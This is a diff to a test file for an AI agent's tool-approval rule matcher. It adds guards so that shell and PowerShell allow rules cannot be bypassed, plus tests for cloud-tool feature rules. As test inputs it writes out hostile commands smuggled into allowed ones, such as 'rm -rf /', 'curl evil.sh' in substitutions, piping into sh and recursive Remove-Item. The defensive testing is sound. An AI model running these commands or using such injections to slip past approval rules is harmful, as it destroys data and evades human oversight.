@@ -136,6 +136,152 @@ await test('Edit glob: "/src/**" does not match /other/path', () => {
   assert.ok(!doesRuleMatch('Edit(/src/**)', 'Edit', '/other/path.ts'))
 })
 
+// ---------------------------------------------------------------------------
+// B.1 Bash allow-rule bypass guards — ensure `Bash(git *)` cannot be tricked
+// into allowing multi-command or injection payloads through the allow-rule
+// path (the command must still fall back to default approval).
+// ---------------------------------------------------------------------------
+
+console.log('\nB.1 — Bash bypass guards')
+
+await test('Bash(git *) does NOT match "git push; rm -rf /"', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git push; rm -rf /'))
+})
+
+await test('Bash(git *) does NOT match "git push && rm -rf /"', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git push && rm -rf /'))
+})
+
+await test('Bash(git *) does NOT match "git push || curl evil.sh"', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git push || curl evil.sh'))
+})
+
+await test('Bash(git *) does NOT match piped command', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git log | sh'))
+})
+
+await test('Bash(git *) does NOT match command substitution $()', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git $(curl evil.sh)'))
+})
+
+await test('Bash(git *) does NOT match backtick substitution', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git `curl evil.sh`'))
+})
+
+await test('Bash(git *) does NOT match ANSI-C quote', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', "git $'a\\nrm -rf /'"))
+})
+
+await test('Bash(git *) does NOT match redirection', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git log > /etc/passwd'))
+})
+
+await test('Bash(git *) does NOT match multi-line command', () => {
+  assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', 'git status\nrm -rf /'))
+})
+
+await test('Bash(git *) still matches single safe command', () => {
+  assert.ok(doesRuleMatch('Bash(git *)', 'Bash', 'git push --force-with-lease'))
+})
+
+await test('Bash tool-level rule also blocks multi-command (no content rule branch)', () => {
+  // Tool-level rule has no ruleContent so hits the early "matches all" path —
+  // that's the user's explicit intent, so we don't guard it here.
+  assert.ok(doesRuleMatch('Bash', 'Bash', 'git push; rm -rf /'))
+})
+
+// ---------------------------------------------------------------------------
+// B.2 PowerShell allow-rule bypass guards — same category of attack as B.1,
+// but PowerShell syntax differs so we use a character-based blacklist instead
+// of shell-quote parsing.
+// ---------------------------------------------------------------------------
+
+console.log('\nB.2 — PowerShell bypass guards')
+
+await test('PowerShell(Get-ChildItem *) does NOT match ";" chaining', () => {
+  assert.ok(
+    !doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem C:\\; Remove-Item -Recurse C:\\Users\\x',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) does NOT match pipeline into Remove-Item', () => {
+  assert.ok(
+    !doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem C:\\ | Remove-Item',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) does NOT match "&&" chaining', () => {
+  assert.ok(
+    !doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem && Remove-Item -Recurse /',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) does NOT match "||" chaining', () => {
+  assert.ok(
+    !doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem || Remove-Item -Recurse /',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) does NOT match subexpression $()', () => {
+  assert.ok(
+    !doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem $(Remove-Item -Recurse C:\\)',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) does NOT match backtick line continuation', () => {
+  assert.ok(
+    !doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem `\nRemove-Item',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) does NOT match multi-line command', () => {
+  assert.ok(
+    !doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem\nRemove-Item',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) still matches single safe command with flags', () => {
+  assert.ok(
+    doesRuleMatch(
+      'PowerShell(Get-ChildItem *)',
+      'PowerShell',
+      'Get-ChildItem -Recurse -Path C:\\Users\\zhao',
+    ),
+  )
+})
+
+await test('PowerShell(Get-ChildItem *) matches bare cmdlet', () => {
+  assert.ok(doesRuleMatch('PowerShell(Get-ChildItem *)', 'PowerShell', 'Get-ChildItem'))
+})
+
 await test('content rule with no matchContent → no match', () => {
   assert.ok(!doesRuleMatch('Bash(git *)', 'Bash', undefined))
 })
@@ -207,6 +353,81 @@ await test('unknown tool: returns tool name', () => {
   assert.equal(suggestRule('CustomTool', {}), 'CustomTool')
 })
 
+await test('CloudModelGenerate: suggests feature-scoped rule', () => {
+  assert.equal(
+    suggestRule('CloudModelGenerate', { feature: 'text-to-image', variant: 'OL-IG-003' }),
+    'CloudModelGenerate(text-to-image)',
+  )
+})
+
+await test('CloudTextGenerate: suggests feature-scoped rule', () => {
+  assert.equal(
+    suggestRule('CloudTextGenerate', { feature: 'ocr', variant: 'OL-OCR-001' }),
+    'CloudTextGenerate(ocr)',
+  )
+})
+
+await test('CloudModelGenerate: missing feature falls back to tool-level', () => {
+  assert.equal(suggestRule('CloudModelGenerate', {}), 'CloudModelGenerate')
+})
+
+// ---------------------------------------------------------------------------
+// D.1 Cloud tool evaluation — feature-level allow / deny
+// ---------------------------------------------------------------------------
+
+console.log('\nD.1 — Cloud tool evaluation')
+
+await test('CloudModelGenerate(text-to-image) matches exact feature', () => {
+  const rules = { allow: ['CloudModelGenerate(text-to-image)'] }
+  assert.equal(
+    evaluateToolRules(rules, 'CloudModelGenerate', { feature: 'text-to-image' }),
+    'allow',
+  )
+})
+
+await test('CloudModelGenerate(text-to-image) does NOT match text-to-video', () => {
+  const rules = { allow: ['CloudModelGenerate(text-to-image)'] }
+  assert.equal(
+    evaluateToolRules(rules, 'CloudModelGenerate', { feature: 'text-to-video' }),
+    'unmatched',
+  )
+})
+
+await test('CloudModelGenerate wildcard text-* matches both image and audio', () => {
+  const rules = { allow: ['CloudModelGenerate(text-*)'] }
+  assert.equal(
+    evaluateToolRules(rules, 'CloudModelGenerate', { feature: 'text-to-image' }),
+    'allow',
+  )
+  assert.equal(
+    evaluateToolRules(rules, 'CloudModelGenerate', { feature: 'text-to-audio' }),
+    'allow',
+  )
+})
+
+await test('CloudModelGenerate deny text-to-video overrides broad allow', () => {
+  const rules = {
+    allow: ['CloudModelGenerate'],
+    deny: ['CloudModelGenerate(text-to-video)'],
+  }
+  assert.equal(
+    evaluateToolRules(rules, 'CloudModelGenerate', { feature: 'text-to-video' }),
+    'deny',
+  )
+  assert.equal(
+    evaluateToolRules(rules, 'CloudModelGenerate', { feature: 'text-to-image' }),
+    'allow',
+  )
+})
+
+await test('CloudTextGenerate(ocr) matches ocr feature', () => {
+  const rules = { allow: ['CloudTextGenerate(ocr)'] }
+  assert.equal(
+    evaluateToolRules(rules, 'CloudTextGenerate', { feature: 'ocr' }),
+    'allow',
+  )
+})
+
 // ---------------------------------------------------------------------------
 // E. mergeToolApprovalRules
 // ---------------------------------------------------------------------------
@@ -241,6 +462,20 @@ await test('Bash extracts command', () => {
 
 await test('Edit extracts file_path', () => {
   assert.equal(extractMatchContent('Edit', { file_path: '/src/foo.ts' }), '/src/foo.ts')
+})
+
+await test('CloudModelGenerate extracts feature', () => {
+  assert.equal(
+    extractMatchContent('CloudModelGenerate', { feature: 'text-to-image', variant: 'OL-IG-003' }),
+    'text-to-image',
+  )
+})
+
+await test('CloudTextGenerate extracts feature', () => {
+  assert.equal(
+    extractMatchContent('CloudTextGenerate', { feature: 'summarize' }),
+    'summarize',
+  )
 })
 
 await test('unknown tool returns undefined', () => {
